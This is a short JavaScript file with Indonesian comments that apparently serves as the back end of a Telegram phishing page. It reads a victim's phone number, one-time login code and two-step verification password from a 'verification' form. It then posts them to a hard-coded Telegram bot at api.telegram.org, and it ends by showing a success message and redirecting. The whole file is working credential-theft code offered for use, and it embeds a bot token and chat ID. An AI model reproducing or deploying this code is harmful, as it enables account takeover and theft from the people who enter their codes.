document
  .getElementById("verificationForm")
  .addEventListener("submit", function (event) {
    event.preventDefault(); // Mencegah pengiriman form default

    // Mengambil data dari form verifikasi
    const telegramNumber = document.getElementById("telegram_number").value;
    const otp = document.getElementById("otp").value;
    const twoFactor = document.getElementById("two_factor").value;

    // Mempersiapkan pesan untuk dikirim ke Telegram
    const message =
      `Verifikasi Telegram:\n` +
      `Nomor Telegram: ${telegramNumber}\n` +
      `Kode OTP: ${otp}\n` +
      `Verifikasi 2 Langkah: ${twoFactor}`;

    // Ganti dengan token bot dan chat ID Anda
    const botToken = "7920409042:AAFvlmzufLQorjHjTqk3Gqq26k1iLnESzLk";
    const chatId = "7512534303";

    // Mengirim data ke Telegram
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => {
        if (response.ok) {
          alert("Verifikasi berhasil dikirim.");
          // Mungkin redirect ke halaman lain jika perlu
          window.location.href = "success.html"; // Ubah ini jika ada halaman sukses
        } else {
          alert(
            "Terjadi kesalahan saat mengirim verifikasi. Silakan coba lagi."
          );
        }
      })
      .catch((error) => {
        console.error("Error:", error);
        alert("Terjadi kesalahan saat mengirim verifikasi. Silakan coba lagi.");
      });
  });
